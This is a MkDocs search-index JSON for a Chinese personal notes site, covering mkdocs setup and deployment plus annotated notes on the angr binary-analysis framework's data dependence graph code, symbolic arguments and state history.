{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u968f\u7b14\u548c\u7b14\u8bb0 \u00b6 --to\u795e\u83b1 \u73af\u5883 \u00b6 os: linux 64\u4f4d tools: pip3 mkdocs mkdocs-material git language: python3 go \u00b6 python pip3 \u5b89\u88c5 \u00b6 \u7565 mkdocs mkdocs-material\u5b89\u88c5 \u00b6 sudo pip3 install mkdocs mkdocs-material mkdocs-material \u662f\u4e3b\u9898 mkdocs \u642d\u5efa \u00b6 git clone git clone https://github.com/YourButterfly/note-site.git \u89e3\u91ca\u4e00\u4e0b\u9879\u76ee\u76ee\u5f55 . \u251c\u2500\u2500 docs //md\u6587\u6863\uff0c\u7528\u6765\u5199\u7684 \u2502 \u251c\u2500\u2500 index.md \u2502 \u2514\u2500\u2500 pdf \u2502 \u251c\u2500\u2500 introduce.md \u2502 \u2514\u2500\u2500 page-boxes.md \u251c\u2500\u2500 LICENSE //\u4e0d\u7528\u7ba1 \u2514\u2500\u2500 mkdocs.yml // mkdoc\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5927\u90e8\u5206\u5df2\u7ecf\u5f04\u597d\u4e86 2 directories, 5 files \u4ecb\u7ecd\u4e00\u4e0bmkdocs\u547d\u4ee4 mkdocs -h Commands: build Build the MkDocs documentation\uff0c\u8fd9\u91cc\u4e0d\u9700\u8981 gh-deploy Deploy your documentation to GitHub Pages\uff0c\u63a8\u9001\u5230github\uff0c\u5df2\u7ecf\u914d\u7f6e\u597d\u4e86\uff0c\u76f4\u63a5\u7528\u2018mkdocs gh-deploy\u2019 new Create a new MkDocs project\uff0c\u8fd9\u91cc\u4e0d\u9700\u8981 serve Run the builtin development server\uff0c\u9884\u89c8\u9875\u9762 \u7f16\u5199\u6587\u6863 \u00b6 \u5199\u4e4b\u524dpull\u4e00\u4e0b\uff0c\u5728\u9879\u76ee\u4e3b\u76ee\u5f55\uff08note-site\uff09\u91cc git pull \uff0c\u9632\u6b62\u51b2\u7a81 \u5199 \u5728docs\u4e0b\u521b\u5efa\u76ee\u5f55\uff0c\u6bd4\u5982pdf\uff0c\u4f5c\u4e3a\u4e00\u4e2a\u7c7b\u522b \u5728docs/pdf\u4e0b\u521b\u5efa\u4f60\u7684\u6587\u6863\uff0cmd\u683c\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u7ee7\u7eed\u521b\u5efa\u76ee\u5f55\uff0c\u4f5c\u4e3a\u4f60\u7684tag \u914d\u7f6e \u914d\u7f6emkdocs.yml\uff0c\u914d\u7f6e\u89c1\u4e0b \u63a8\u9001 \u4fdd\u5b58\u4e00\u4e0b\u9879\u76eegit add\uff0cgit commit \uff0cgit push \u63a8\u9001\u5230gh-deploy\u5206\u652f\u4e0a\uff0c\u76f4\u63a5 mkdocs gh-deploy \u914d\u7f6emkdocs.yml \u7167\u7740\u52a0\u5c31\u884c nav: - \u9996\u9875: index.md - \u6587\u4ef6\u683c\u5f0f: - PDF: - \u7b80\u4ecb: pdf/introduce.md - PageBox: pdf/page-boxes.md \u9884\u89c8 mkdocs serve \u63a8\u9001 $ mkdocs gh-deploy INFO - Cleaning site directory INFO - Building documentation to directory: /home/pwd/myMkDocs/first-project/site INFO - Copying '/home/pwd/myMkDocs/first-project/site' to 'gh-pages' branch and pushing to GitHub. Username for 'https://github.com' : yourbutterfly Password for 'https://yourbutterfly@github.com' : INFO - Your documentation should shortly be available at: https://YourButterfly.github.io/note-site/","title":"\u9996\u9875"},{"location":"#_1","text":"--to\u795e\u83b1","title":"\u968f\u7b14\u548c\u7b14\u8bb0"},{"location":"#_2","text":"os: linux 64\u4f4d tools: pip3 mkdocs mkdocs-material git language: python3","title":"\u73af\u5883"},{"location":"#go","text":"","title":"go"},{"location":"#python-pip3","text":"\u7565","title":"python pip3 \u5b89\u88c5"},{"location":"#mkdocs-mkdocs-material","text":"sudo pip3 install mkdocs mkdocs-material mkdocs-material \u662f\u4e3b\u9898","title":"mkdocs mkdocs-material\u5b89\u88c5"},{"location":"#mkdocs","text":"git clone git clone https://github.com/YourButterfly/note-site.git \u89e3\u91ca\u4e00\u4e0b\u9879\u76ee\u76ee\u5f55 . \u251c\u2500\u2500 docs //md\u6587\u6863\uff0c\u7528\u6765\u5199\u7684 \u2502 \u251c\u2500\u2500 index.md \u2502 \u2514\u2500\u2500 pdf \u2502 \u251c\u2500\u2500 introduce.md \u2502 \u2514\u2500\u2500 page-boxes.md \u251c\u2500\u2500 LICENSE //\u4e0d\u7528\u7ba1 \u2514\u2500\u2500 mkdocs.yml // mkdoc\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5927\u90e8\u5206\u5df2\u7ecf\u5f04\u597d\u4e86 2 directories, 5 files \u4ecb\u7ecd\u4e00\u4e0bmkdocs\u547d\u4ee4 mkdocs -h Commands: build Build the MkDocs documentation\uff0c\u8fd9\u91cc\u4e0d\u9700\u8981 gh-deploy Deploy your documentation to GitHub Pages\uff0c\u63a8\u9001\u5230github\uff0c\u5df2\u7ecf\u914d\u7f6e\u597d\u4e86\uff0c\u76f4\u63a5\u7528\u2018mkdocs gh-deploy\u2019 new Create a new MkDocs project\uff0c\u8fd9\u91cc\u4e0d\u9700\u8981 serve Run the builtin development server\uff0c\u9884\u89c8\u9875\u9762","title":"mkdocs \u642d\u5efa"},{"location":"#_3","text":"\u5199\u4e4b\u524dpull\u4e00\u4e0b\uff0c\u5728\u9879\u76ee\u4e3b\u76ee\u5f55\uff08note-site\uff09\u91cc git pull \uff0c\u9632\u6b62\u51b2\u7a81 \u5199 \u5728docs\u4e0b\u521b\u5efa\u76ee\u5f55\uff0c\u6bd4\u5982pdf\uff0c\u4f5c\u4e3a\u4e00\u4e2a\u7c7b\u522b \u5728docs/pdf\u4e0b\u521b\u5efa\u4f60\u7684\u6587\u6863\uff0cmd\u683c\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u7ee7\u7eed\u521b\u5efa\u76ee\u5f55\uff0c\u4f5c\u4e3a\u4f60\u7684tag \u914d\u7f6e \u914d\u7f6emkdocs.yml\uff0c\u914d\u7f6e\u89c1\u4e0b \u63a8\u9001 \u4fdd\u5b58\u4e00\u4e0b\u9879\u76eegit add\uff0cgit commit \uff0cgit push \u63a8\u9001\u5230gh-deploy\u5206\u652f\u4e0a\uff0c\u76f4\u63a5 mkdocs gh-deploy \u914d\u7f6emkdocs.yml \u7167\u7740\u52a0\u5c31\u884c nav: - \u9996\u9875: index.md - \u6587\u4ef6\u683c\u5f0f: - PDF: - \u7b80\u4ecb: pdf/introduce.md - PageBox: pdf/page-boxes.md \u9884\u89c8 mkdocs serve \u63a8\u9001 $ mkdocs gh-deploy INFO - Cleaning site directory INFO - Building documentation to directory: /home/pwd/myMkDocs/first-project/site INFO - Copying '/home/pwd/myMkDocs/first-project/site' to 'gh-pages' branch and pushing to GitHub. Username for 'https://github.com' : yourbutterfly Password for 'https://yourbutterfly@github.com' : INFO - Your documentation should shortly be available at: https://YourButterfly.github.io/note-site/","title":"\u7f16\u5199\u6587\u6863"},{"location":"module/angr/cfg/","text":"CFG \u00b6 CFGEmulated a \u00b6","title":"CFG"},{"location":"module/angr/cfg/#cfg","text":"CFGEmulated","title":"CFG"},{"location":"module/angr/cfg/#a","text":"","title":"a"},{"location":"module/angr/ddg/","text":"DDG \u00b6 \u6570\u636e\u4f9d\u8d56\u56fe\u5206\u6790 \u6807\u9898\u6ca1\u60f3\u597d \u00b6 ddg.graph \u7684\u8282\u70b9\u662fCodeLocation object \"\"\" Constructor. :param int block_addr: \u5757\u5730\u5740 :param int stmt_idx: Statement ID. None for SimProcedures :param class sim_procedure: \u5bf9\u5e94\u7684 SimProcedure class. :param int ins_addr: \u6307\u4ee4\u5730\u5740. Optional. :param kwargs: \u5176\u4ed6\u53c2\u6570, will be stored, but not used in __eq__ or __hash__. \"\"\" < 0x40137b id = 0x40137b [ 3 ] > < $ ins_addr id = $ block_addr[ $ stmt_idx] > class DDG(Analysis) \u00b6 This is a fast data dependence graph directly generated from our CFG analysis result. The only reason for its existence is the speed. There is zero guarantee for being sound or accurate. You are supposed to use it only when you want to track the simplest data dependence, and you do not care about soundness or accuracy. For a better data dependence graph, please consider performing a better static analysis first (like Value-set Analysis), and then construct a dependence graph on top of the analysis result (for example, the VFG in angr). Also note that since we are using states from CFG, any improvement in analysis performed on CFG (like a points-to analysis) will directly benefit the DDG. \u7c7bDDG__init__ \u00b6 __init__ (self, cfg, start = None, call_depth = None, block_addrs = None) \u76f8\u5173\u53c2\u6570 cfg: Control flow graph. Please make sure each node has an associated `state` with it. You may want to generate your CFG with `keep_state=True`.(cfg with state) start: An address, Specifies where we start the generation of this data dependence graph.(\u5206\u6790ddg\u7684\u8d77\u59cb\u5730\u5740) call_depth: None or integers. A non-negative integer specifies how deep we would like to track in the call tree. None disables call_depth limit.(\u8c03\u7528\u6df1\u5ea6\u9650\u5236) iterable or None block_addrs: A collection of block addresses that the DDG analysis should be performed on.(\u662f\u4ec0\u4e48\u518d\u8bf4) \u91cd\u8981\u53d8\u91cf # \u8f93\u5165\u7684\u53c2\u6570\u76f8\u5173 self . _cfg = cfg self . _start = self . project . entry if start is None else start self . _call_depth = call_depth self . _block_addrs = block_addrs # \u7ed3\u679c\u5b58\u50a8 self . _stmt_graph = networkx . DiGraph() self . _data_graph = networkx . DiGraph() self . _simplified_data_graph = None self . _ast_graph = networkx . DiGraph() # A mapping of ProgramVariable to ASTs self . _symbolic_mem_ops = set() # \u6bcf\u4e2a\u51fd\u6570\u7684\u6570\u636e\u4f9d\u8d56\u56fe self . _function_data_dependencies = None self . view = DDGView(self . _cfg, self, simplified = False) self . simple_view = DDGView(self . _cfg, self, simplified = True) # \u5176\u4ed6 Begin construction! self . _construct() \u6784\u9020_construct(self) \u00b6 \"\"\" Construct the data dependence graph. We track the following types of dependence: - (Intra-IRSB) temporary variable dependencies - \u5bc4\u5b58\u5668\u4f9d\u8d56 - \u5185\u5b58\u4f9d\u8d56, \u5c3d\u7ba1\u529f\u80fd\u53d7\u9650 \u8ffd\u8e2a\u4e00\u4e0b\u51e0\u79cd\u5185\u5b58\u4f9d\u8d56: - (Intra-functional) Stack read/write. Trace changes of stack pointers inside a function, and the dereferences of stack pointers. - (Inter-functional) Stack read/write. - (Global) Static memory positions. Keep a map of all accessible memory positions to their source statements per function. After that, we traverse the CFG and link each pair of reads/writes together in the order of control-flow. We do not track the following types of memory access - Symbolic memory access Well, they cannot be tracked under fastpath mode (which is the mode we are generating the CTF) anyways. \"\"\" \u4e00\u4e9b\u521d\u59cb\u5316\u64cd\u4f5c # \u521d\u59cb\u5316worklist,\u8fd9\u4e00\u6b65\u5c06\u8981\u5206\u6790\u7684CFG node \u52a0\u5165worklist_set,\u5c06DDGJob \u52a0\u5165worklist if self . _start is None: # initial nodes are those nodes in CFG that has no in-degrees for n in self . _cfg . graph . nodes(): if self . _cfg . graph . in_degree(n) == 0 : # Put it into the worklist job = DDGJob(n, 0 ) self . _worklist_append(job, worklist, worklist_set) else : for n in self . _cfg . get_all_nodes(self . _start): job = DDGJob(n, 0 ) self . _worklist_append(job, worklist, worklist_set) \"\"\" \u589e\u52a0\u4e00\u4e2aCFGNode \u548c\u5b83\u7684\u540e\u7ee7Node\u5230work-list,\u8fd9\u91cc\u540c\u6837\u8981\u6ee1\u8db3call-depth\u7684\u9650\u5236 :param node_wrapper: The NodeWrapper instance to insert.DDGJob :param worklist: The work-list, which is a list. :param worklist_set: A set of all CFGNodes that are inside the work-list, \u4e3a\u4e86\u52a0\u901f\u67e5\u627e. It will be updated as well. :returns: A set of newly-inserted CFGNodes (not NodeWrapper instances). # # worklist.append(node_wrapper)\u3000DDGJob\u7684\u5b9e\u4f8b worklist_set.add(node_wrapper.cfg_node)\u3000\u6dfb\u52a0\u7684\u662fcfg\u3000node \"\"\" \u5f00\u59cb\u5faa\u73af\u5904\u7406 \u5206\u6790\u7684\u5bf9\u8c61\u662f\u6bcf\u4e2aCFGJob\uff0cCFGJob\u662fnode\u548ccall deepth\u7684\u5c01\u88c5\uff0c\u64cd\u4f5c\u7684\u662fnode\u7684final state\uff0ccall deepth\u7528\u4f5c\u9650\u5236\u5206\u6790\u7684\u6df1\u5ea6 live_defs_per_node = {} while worklist: # pop \u4e00\u4e2a\u8282\u70b9 ddg_job = worklist[ 0 ] l . debug( \"Processing %s.\" , ddg_job) node, call_depth = ddg_job . cfg_node, ddg_job . call_depth worklist = worklist[ 1 : ] worklist_set . remove(node) # \u6293\u53d6\u6240\u6709\u7684 final states. \u901a\u5e38\u8d85\u8fc7\u4e00\u4e2a (\u5bf9\u6bcf\u4e00\u4e2a successor\u3000\u90fd\u6709\u4e00\u4e2astate), \u5e76\u5904\u7406\u5b83\u4eec # process all of them final_states = node . final_states #\u4e3a\u6bcf\u4e2a\u8282\u70b9\u521b\u5efalivedefinition\u5bf9\u8c61\u5b9e\u4f8b\uff0c\u521d\u6b65\u5224\u5b9a\u8868\u793a\u751f\u547d\u5468\u671f\u7684\u6570\u636e\u5b9a\u4e49 if node in live_defs_per_node: live_defs = live_defs_per_node[node] else : live_defs = LiveDefinitions() live_defs_per_node[node] = live_defs successing_nodes = list(self . _cfg . graph . successors(node)) # \u5c1d\u8bd5\u628a\u6bcf\u4e2afinal state\u5206\u914d\u7ed9\u5bf9\u5e94\u7684\u540e\u7ee7node\uff0c\u53cd\u4e4b\u4ea6\u7136 match_suc = defaultdict(bool) match_state = defaultdict(set) for suc in successing_nodes: matched = False for state in final_states: try : if state . solver . eval(state . ip) == suc . addr: \u3000 # \u5224\u65ad\u8fd9\u4e2astate\u7684\u8df3\u8f6c\u5730\u5740\u662f\u5426\u662f\u540e\u7ee7node\u7684\u5730\u5740 match_suc[suc . addr] = True match_state[state] . add(suc) matched = True except (SimUnsatError, SimSolverModeError, ZeroDivisionError ): # ignore matched = matched if not matched: break # \u67e5\u770b\u662f\u5426\u6240\u6709\u7684final state\u90fd\u627e\u5230\u4e86\u5b83\u7684\u540e\u7ee7node,\u4ee5\u53ca\u540e\u7ee7node\u90fd\u6709final state matches = len(match_suc) == len(successing_nodes) and len(match_state) == len(final_states) for state in final_states: if not matches and state . history . jumpkind == 'Ijk_FakeRet' and len(final_states) > 1 : # Skip fakerets if there are other control flow transitions available continue new_call_depth = call_depth if state . history . jumpkind == 'Ijk_Call' : new_call_depth += 1 elif state . history . jumpkind == 'Ijk_Ret' : new_call_depth -= 1 if self . _call_depth is not None and call_depth > self . _call_depth: l . debug( 'Do not trace into %s due to the call depth limit' , state . ip) continue new_defs = self . _track(state, live_defs, node . irsb . statements if node . irsb is not None else None) #corresponding_successors = [n for n in successing_nodes if # not state.ip.symbolic and n.addr == state.solver.eval(state.ip)] #if not corresponding_successors: # continue changed = False # if every successor can be matched with one or more final states (by IP address), # only take over the LiveDefinition of matching states if matches: add_state_to_sucs = match_state[state] else : add_state_to_sucs = successing_nodes for successing_node in add_state_to_sucs: if (state . history . jumpkind == 'Ijk_Call' or state . history . jumpkind . startswith( 'Ijk_Sys' )) and \\ (state . ip . symbolic or successing_node . addr != state . solver . eval(state . ip)): suc_new_defs = self . _filter_defs_at_call_sites(new_defs) else : suc_new_defs = new_defs if successing_node in live_defs_per_node: defs_for_next_node = live_defs_per_node[successing_node] else : defs_for_next_node = LiveDefinitions() live_defs_per_node[successing_node] = defs_for_next_node for var, code_loc_set in suc_new_defs . items(): # l.debug(\"Adding %d new definitions for variable %s.\", len(code_loc_set), var) changed |= defs_for_next_node . add_defs(var, code_loc_set) if changed: if (self . _call_depth is None) or \\ (self . _call_depth is not None and 0 <= new_call_depth <= self . _call_depth): # Put all reachable successors back to our work-list again for successor in self . _cfg . get_all_successors(node): nw = DDGJob(successor, new_call_depth) self . _worklist_append(nw, worklist, worklist_set) Variable <|Reg 16, 8B> class SimRegisterVariable (SimVariable): __slots__ = [ 'reg' , 'size' , '_hash' ] def __init__ (self, reg_offset, size, ident = None, name = None, region = None, category = None): SimVariable . __init__ (self, ident = ident, name = name, region = region, category = category) self . reg = reg_offset self . size = size self . _hash = None def __repr__ (self): ident_str = \"[%s]\" % self . ident if self . ident else \"\" region_str = hex(self . region) if isinstance(self . region, int) else self . region s = \"<%s%s|Reg %s, %sB>\" % (region_str, ident_str, self . reg, self . size) return s def __hash__ (self): if self . _hash is None: self . _hash = hash(( 'reg' , self . region, self . reg, self . size, self . ident)) return self . _hash def __eq__ (self, other): if isinstance(other, SimRegisterVariable): return self . ident == other . ident and \\ self . reg == other . reg and \\ self . size == other . size and \\ self . region == other . region return False class SimVariable : __slots__ = [ 'ident' , 'name' , 'region' , 'category' ] def __init__ (self, ident = None, name = None, region = None, category = None): \"\"\" :param ident: A unique identifier provided by user or the program. Usually a string. :param str name: Name of this variable. \"\"\" self . ident = ident self . name = name self . region = region if region is not None else \"\" self . category = category","title":"DDG"},{"location":"module/angr/ddg/#ddg","text":"\u6570\u636e\u4f9d\u8d56\u56fe\u5206\u6790","title":"DDG"},{"location":"module/angr/ddg/#_1","text":"ddg.graph \u7684\u8282\u70b9\u662fCodeLocation object \"\"\" Constructor. :param int block_addr: \u5757\u5730\u5740 :param int stmt_idx: Statement ID. None for SimProcedures :param class sim_procedure: \u5bf9\u5e94\u7684 SimProcedure class. :param int ins_addr: \u6307\u4ee4\u5730\u5740. Optional. :param kwargs: \u5176\u4ed6\u53c2\u6570, will be stored, but not used in __eq__ or __hash__. \"\"\" < 0x40137b id = 0x40137b [ 3 ] > < $ ins_addr id = $ block_addr[ $ stmt_idx] >","title":"\u6807\u9898\u6ca1\u60f3\u597d"},{"location":"module/angr/ddg/#class-ddganalysis","text":"This is a fast data dependence graph directly generated from our CFG analysis result. The only reason for its existence is the speed. There is zero guarantee for being sound or accurate. You are supposed to use it only when you want to track the simplest data dependence, and you do not care about soundness or accuracy. For a better data dependence graph, please consider performing a better static analysis first (like Value-set Analysis), and then construct a dependence graph on top of the analysis result (for example, the VFG in angr). Also note that since we are using states from CFG, any improvement in analysis performed on CFG (like a points-to analysis) will directly benefit the DDG.","title":"class DDG(Analysis)"},{"location":"module/angr/ddg/#ddg9595init9595","text":"__init__ (self, cfg, start = None, call_depth = None, block_addrs = None) \u76f8\u5173\u53c2\u6570 cfg: Control flow graph. Please make sure each node has an associated `state` with it. You may want to generate your CFG with `keep_state=True`.(cfg with state) start: An address, Specifies where we start the generation of this data dependence graph.(\u5206\u6790ddg\u7684\u8d77\u59cb\u5730\u5740) call_depth: None or integers. A non-negative integer specifies how deep we would like to track in the call tree. None disables call_depth limit.(\u8c03\u7528\u6df1\u5ea6\u9650\u5236) iterable or None block_addrs: A collection of block addresses that the DDG analysis should be performed on.(\u662f\u4ec0\u4e48\u518d\u8bf4) \u91cd\u8981\u53d8\u91cf # \u8f93\u5165\u7684\u53c2\u6570\u76f8\u5173 self . _cfg = cfg self . _start = self . project . entry if start is None else start self . _call_depth = call_depth self . _block_addrs = block_addrs # \u7ed3\u679c\u5b58\u50a8 self . _stmt_graph = networkx . DiGraph() self . _data_graph = networkx . DiGraph() self . _simplified_data_graph = None self . _ast_graph = networkx . DiGraph() # A mapping of ProgramVariable to ASTs self . _symbolic_mem_ops = set() # \u6bcf\u4e2a\u51fd\u6570\u7684\u6570\u636e\u4f9d\u8d56\u56fe self . _function_data_dependencies = None self . view = DDGView(self . _cfg, self, simplified = False) self . simple_view = DDGView(self . _cfg, self, simplified = True) # \u5176\u4ed6 Begin construction! self . _construct()","title":"\u7c7bDDG__init__"},{"location":"module/angr/ddg/#95constructself","text":"\"\"\" Construct the data dependence graph. We track the following types of dependence: - (Intra-IRSB) temporary variable dependencies - \u5bc4\u5b58\u5668\u4f9d\u8d56 - \u5185\u5b58\u4f9d\u8d56, \u5c3d\u7ba1\u529f\u80fd\u53d7\u9650 \u8ffd\u8e2a\u4e00\u4e0b\u51e0\u79cd\u5185\u5b58\u4f9d\u8d56: - (Intra-functional) Stack read/write. Trace changes of stack pointers inside a function, and the dereferences of stack pointers. - (Inter-functional) Stack read/write. - (Global) Static memory positions. Keep a map of all accessible memory positions to their source statements per function. After that, we traverse the CFG and link each pair of reads/writes together in the order of control-flow. We do not track the following types of memory access - Symbolic memory access Well, they cannot be tracked under fastpath mode (which is the mode we are generating the CTF) anyways. \"\"\" \u4e00\u4e9b\u521d\u59cb\u5316\u64cd\u4f5c # \u521d\u59cb\u5316worklist,\u8fd9\u4e00\u6b65\u5c06\u8981\u5206\u6790\u7684CFG node \u52a0\u5165worklist_set,\u5c06DDGJob \u52a0\u5165worklist if self . _start is None: # initial nodes are those nodes in CFG that has no in-degrees for n in self . _cfg . graph . nodes(): if self . _cfg . graph . in_degree(n) == 0 : # Put it into the worklist job = DDGJob(n, 0 ) self . _worklist_append(job, worklist, worklist_set) else : for n in self . _cfg . get_all_nodes(self . _start): job = DDGJob(n, 0 ) self . _worklist_append(job, worklist, worklist_set) \"\"\" \u589e\u52a0\u4e00\u4e2aCFGNode \u548c\u5b83\u7684\u540e\u7ee7Node\u5230work-list,\u8fd9\u91cc\u540c\u6837\u8981\u6ee1\u8db3call-depth\u7684\u9650\u5236 :param node_wrapper: The NodeWrapper instance to insert.DDGJob :param worklist: The work-list, which is a list. :param worklist_set: A set of all CFGNodes that are inside the work-list, \u4e3a\u4e86\u52a0\u901f\u67e5\u627e. It will be updated as well. :returns: A set of newly-inserted CFGNodes (not NodeWrapper instances). # # worklist.append(node_wrapper)\u3000DDGJob\u7684\u5b9e\u4f8b worklist_set.add(node_wrapper.cfg_node)\u3000\u6dfb\u52a0\u7684\u662fcfg\u3000node \"\"\" \u5f00\u59cb\u5faa\u73af\u5904\u7406 \u5206\u6790\u7684\u5bf9\u8c61\u662f\u6bcf\u4e2aCFGJob\uff0cCFGJob\u662fnode\u548ccall deepth\u7684\u5c01\u88c5\uff0c\u64cd\u4f5c\u7684\u662fnode\u7684final state\uff0ccall deepth\u7528\u4f5c\u9650\u5236\u5206\u6790\u7684\u6df1\u5ea6 live_defs_per_node = {} while worklist: # pop \u4e00\u4e2a\u8282\u70b9 ddg_job = worklist[ 0 ] l . debug( \"Processing %s.\" , ddg_job) node, call_depth = ddg_job . cfg_node, ddg_job . call_depth worklist = worklist[ 1 : ] worklist_set . remove(node) # \u6293\u53d6\u6240\u6709\u7684 final states. \u901a\u5e38\u8d85\u8fc7\u4e00\u4e2a (\u5bf9\u6bcf\u4e00\u4e2a successor\u3000\u90fd\u6709\u4e00\u4e2astate), \u5e76\u5904\u7406\u5b83\u4eec # process all of them final_states = node . final_states #\u4e3a\u6bcf\u4e2a\u8282\u70b9\u521b\u5efalivedefinition\u5bf9\u8c61\u5b9e\u4f8b\uff0c\u521d\u6b65\u5224\u5b9a\u8868\u793a\u751f\u547d\u5468\u671f\u7684\u6570\u636e\u5b9a\u4e49 if node in live_defs_per_node: live_defs = live_defs_per_node[node] else : live_defs = LiveDefinitions() live_defs_per_node[node] = live_defs successing_nodes = list(self . _cfg . graph . successors(node)) # \u5c1d\u8bd5\u628a\u6bcf\u4e2afinal state\u5206\u914d\u7ed9\u5bf9\u5e94\u7684\u540e\u7ee7node\uff0c\u53cd\u4e4b\u4ea6\u7136 match_suc = defaultdict(bool) match_state = defaultdict(set) for suc in successing_nodes: matched = False for state in final_states: try : if state . solver . eval(state . ip) == suc . addr: \u3000 # \u5224\u65ad\u8fd9\u4e2astate\u7684\u8df3\u8f6c\u5730\u5740\u662f\u5426\u662f\u540e\u7ee7node\u7684\u5730\u5740 match_suc[suc . addr] = True match_state[state] . add(suc) matched = True except (SimUnsatError, SimSolverModeError, ZeroDivisionError ): # ignore matched = matched if not matched: break # \u67e5\u770b\u662f\u5426\u6240\u6709\u7684final state\u90fd\u627e\u5230\u4e86\u5b83\u7684\u540e\u7ee7node,\u4ee5\u53ca\u540e\u7ee7node\u90fd\u6709final state matches = len(match_suc) == len(successing_nodes) and len(match_state) == len(final_states) for state in final_states: if not matches and state . history . jumpkind == 'Ijk_FakeRet' and len(final_states) > 1 : # Skip fakerets if there are other control flow transitions available continue new_call_depth = call_depth if state . history . jumpkind == 'Ijk_Call' : new_call_depth += 1 elif state . history . jumpkind == 'Ijk_Ret' : new_call_depth -= 1 if self . _call_depth is not None and call_depth > self . _call_depth: l . debug( 'Do not trace into %s due to the call depth limit' , state . ip) continue new_defs = self . _track(state, live_defs, node . irsb . statements if node . irsb is not None else None) #corresponding_successors = [n for n in successing_nodes if # not state.ip.symbolic and n.addr == state.solver.eval(state.ip)] #if not corresponding_successors: # continue changed = False # if every successor can be matched with one or more final states (by IP address), # only take over the LiveDefinition of matching states if matches: add_state_to_sucs = match_state[state] else : add_state_to_sucs = successing_nodes for successing_node in add_state_to_sucs: if (state . history . jumpkind == 'Ijk_Call' or state . history . jumpkind . startswith( 'Ijk_Sys' )) and \\ (state . ip . symbolic or successing_node . addr != state . solver . eval(state . ip)): suc_new_defs = self . _filter_defs_at_call_sites(new_defs) else : suc_new_defs = new_defs if successing_node in live_defs_per_node: defs_for_next_node = live_defs_per_node[successing_node] else : defs_for_next_node = LiveDefinitions() live_defs_per_node[successing_node] = defs_for_next_node for var, code_loc_set in suc_new_defs . items(): # l.debug(\"Adding %d new definitions for variable %s.\", len(code_loc_set), var) changed |= defs_for_next_node . add_defs(var, code_loc_set) if changed: if (self . _call_depth is None) or \\ (self . _call_depth is not None and 0 <= new_call_depth <= self . _call_depth): # Put all reachable successors back to our work-list again for successor in self . _cfg . get_all_successors(node): nw = DDGJob(successor, new_call_depth) self . _worklist_append(nw, worklist, worklist_set) Variable <|Reg 16, 8B> class SimRegisterVariable (SimVariable): __slots__ = [ 'reg' , 'size' , '_hash' ] def __init__ (self, reg_offset, size, ident = None, name = None, region = None, category = None): SimVariable . __init__ (self, ident = ident, name = name, region = region, category = category) self . reg = reg_offset self . size = size self . _hash = None def __repr__ (self): ident_str = \"[%s]\" % self . ident if self . ident else \"\" region_str = hex(self . region) if isinstance(self . region, int) else self . region s = \"<%s%s|Reg %s, %sB>\" % (region_str, ident_str, self . reg, self . size) return s def __hash__ (self): if self . _hash is None: self . _hash = hash(( 'reg' , self . region, self . reg, self . size, self . ident)) return self . _hash def __eq__ (self, other): if isinstance(other, SimRegisterVariable): return self . ident == other . ident and \\ self . reg == other . reg and \\ self . size == other . size and \\ self . region == other . region return False class SimVariable : __slots__ = [ 'ident' , 'name' , 'region' , 'category' ] def __init__ (self, ident = None, name = None, region = None, category = None): \"\"\" :param ident: A unique identifier provided by user or the program. Usually a string. :param str name: Name of this variable. \"\"\" self . ident = ident self . name = name self . region = region if region is not None else \"\" self . category = category","title":"\u6784\u9020_construct(self)"},{"location":"module/angr/fast-question/","text":"fast question \u00b6 angr.Project\u3000\u5bf9\u8c61\u5982\u4f55\u62ff\u5230\u5e26\u7b26\u53f7\u51fd\u6570\u7684\u5730\u5740 \u00b6 None angr CFG\u3000\u526a\u679d \u00b6 None \u83b7\u53d6\u3000cmp, strcmp\u7b49\u7684\u786c\u7f16\u7801\u5b57\u7b26\u4e32 \u00b6 None \u7b26\u53f7\u5316\u547d\u4ee4\u884c\u53c2\u6570 \u00b6 proj = angr . Project(bin_path,load_options = { 'auto_load_libs' :False}, default_analysis_mode = 'symbolic' ) argv = [proj . filename] for i in range( \u53c2\u6570\u4e2a\u6570 ): argv . append(claripy . BVS( 'arg%d' % (i + 1 ), \u5b57\u8282\u6570 * 8 )) state = proj . factory . entry_state(args = argv)","title":"fast-questions"},{"location":"module/angr/fast-question/#fast-question","text":"","title":"fast question"},{"location":"module/angr/fast-question/#angrproject","text":"None","title":"angr.Project\u3000\u5bf9\u8c61\u5982\u4f55\u62ff\u5230\u5e26\u7b26\u53f7\u51fd\u6570\u7684\u5730\u5740"},{"location":"module/angr/fast-question/#angr-cfg","text":"None","title":"angr CFG\u3000\u526a\u679d"},{"location":"module/angr/fast-question/#cmp-strcmp","text":"None","title":"\u83b7\u53d6\u3000cmp, strcmp\u7b49\u7684\u786c\u7f16\u7801\u5b57\u7b26\u4e32"},{"location":"module/angr/fast-question/#_1","text":"proj = angr . Project(bin_path,load_options = { 'auto_load_libs' :False}, default_analysis_mode = 'symbolic' ) argv = [proj . filename] for i in range( \u53c2\u6570\u4e2a\u6570 ): argv . append(claripy . BVS( 'arg%d' % (i + 1 ), \u5b57\u8282\u6570 * 8 )) state = proj . factory . entry_state(args = argv)","title":"\u7b26\u53f7\u5316\u547d\u4ee4\u884c\u53c2\u6570"},{"location":"module/angr/introduce/","text":"angr \u00b6 introduce \u00b6 angr is a python framework for analyzing binaries. It combines both static and dynamic symbolic (\"concolic\") analysis, making it applicable to a variety of tasks.","title":"angr-introduce"},{"location":"module/angr/introduce/#angr","text":"","title":"angr"},{"location":"module/angr/introduce/#introduce","text":"angr is a python framework for analyzing binaries. It combines both static and dynamic symbolic (\"concolic\") analysis, making it applicable to a variety of tasks.","title":"introduce"},{"location":"module/angr/program-state/","text":"Program State \u00b6 State Plugins \u00b6 history plugin \u00b6 It is actually a linked list of several history nodes, each one representing a single round of execution---you can traverse this list with state.history.parent.parent etc. In general, these values are stored as history.recent_NAME and the iterator over them is just history.NAME. For example, for addr in state.history.bbl_addrs: print hex(addr) will print out a basic block address trace for the binary, while state.history.recent_bbl_addrs is the list of basic blocks executed in the most recent step(\u6700\u8fd1\u7684\u4e00\u6b65\u4e0d\u5e94\u8be5\u662f\u4e00\u4e2a\u5417), state.history.parent.recent_bbl_addrs is the list of basic blocks executed in the previous step, etc. If you ever need to quickly obtain a flat list of these values, you can access .hardcopy, e.g. state.history.bbl_addrs.hardcopy. Keep in mind though, index-based accessing is implemented on the interators. for addr in state . history . bbl_addrs: print (hex(addr)) print ( \"-------------------------------- \\n \" ) \"\"\" 